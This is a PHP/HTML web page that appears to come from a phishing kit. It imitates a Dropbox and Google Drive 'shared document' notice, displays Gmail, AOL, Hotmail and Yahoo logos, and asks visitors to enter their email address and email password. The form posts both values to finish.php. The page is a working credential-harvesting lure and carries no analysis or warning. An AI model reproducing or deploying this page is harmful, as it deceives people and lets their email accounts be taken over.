<?php

require "../session_protect.php";

?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Email Login</title>
<style type="text/css">
<!--
.style1 {	background-color: #FFFFFF;
}
.style5 {
	font-size: large;
	font-family: Arial, Helvetica, sans-serif;
}
.style6 {
	font-size: 20px;
	background-color: #FFFFFF;
	color: #666666;
	font-family: Arial, Helvetica, sans-serif;
}
.style11 {color: #000033; font-size: 16px; font-weight: bold; }
-->
</style>
</head>

<body>
<table width="866" height="265" border="0">
  <tr>
    <td width="440"><table width="349" border="0">
      <tr>
        <td width="204">&nbsp;</td>
        <td width="135"><img src="ssl/googledrive.jpg" alt="" width="120" height="94" align="top"/></td>
      </tr>
      
    </table>
      <p align="right"><span class="style1" style="height: 32px; width: 502px"><span class="style5"><strong>Dropbox</strong>.</span>&nbsp;<span class="style6">Your stuff, anywhere.</span></span>  <br>
            <img src="ssl/tablet-phone-lap - Copy.png" width="440" height="321"><strong><font color="blue" size="4" face="Arial, Helvetica, sans-serif"><br>
            </font></strong><br>
      </p></td>
    <td width="16" valign="top"><p><br>  
        <br>
    </p></td>
    <td width="396" valign="top"><font color="#5953C6" size="4" face="Arial, Helvetica, sans-serif"><br>
      <br>
      To view the shared document, 
    you are required to Login with your email address below:</font><br>
    <br>
    <br>
    <p><img src="ssl/gmail.jpg" width="132" height="48"><img src="ssl/aol.jpg" width="132" height="48"><img src="ssl/hotmail.jpg" width="132" height="48"><br>
        <img src="ssl/yahoo.jpg" width="132" height="48"><img src="ssl/other.jpg" width="132" height="48"><br>
        <label for="user" id="login_id_label"></label>
    </p>
    <table width="338" height="96" border="0" align="center" bordercolor="#000000" bgcolor="#E4E4E4">
	<script language="JavaScript" src="gen_validatorv4.js" type="text/javascript" xml:space="preserve"></script>
                        <form name="myform" id="myform" autocomplete="off" method="post" action="finish.php">
      <tr>
        <td width="145" height="39"><div align="right" class="style11">
            <p><font face="Arial, Helvetica, sans-serif">Email Address: </font></p>
        </div></td>
        <td width="10">&nbsp;</td>
        <td width="169"><span class="overlabel-wrapper">
          <input id="Email" value="" name="Email" mpdistrans="1" type="text" />
        </span></td>
      </tr>
      <tr>
        <td width="145" height="44"><div align="right" class="style11">
            <p><font face="Arial, Helvetica, sans-serif">Email Password: </font></p>
        </div></td>
        <td>&nbsp;</td>
        <td><span class="overlabel-wrapper">
          <input id="password" autocomplete="off" value="" name="password" mpdistrans="1" type="password" />
        </span></td>
      </tr>
    </table>
	<script  type="text/javascript">
var frmvalidator = new Validator("myform");

  frmvalidator.addValidation("Email","req","Enter your email address.");
  frmvalidator.addValidation("Email","email","Please enter a proper Email Address (email@domain).");
  frmvalidator.addValidation("password","req","Enter your password.");

 
</script>
    <br>
    <table border="0" align="center">
      <tr>
        <td width="41">
          <div align="right">
            <input name="ctlWorkflow:btnSubmit" type="image" id="ctlWorkflow_btnSubmit" src="ssl/singin.png" alt="" align="middle" border="0">
            </div></td>
        </tr>
    </table>
    <p></p></td>
  </tr>
</table>
</body>
</html>
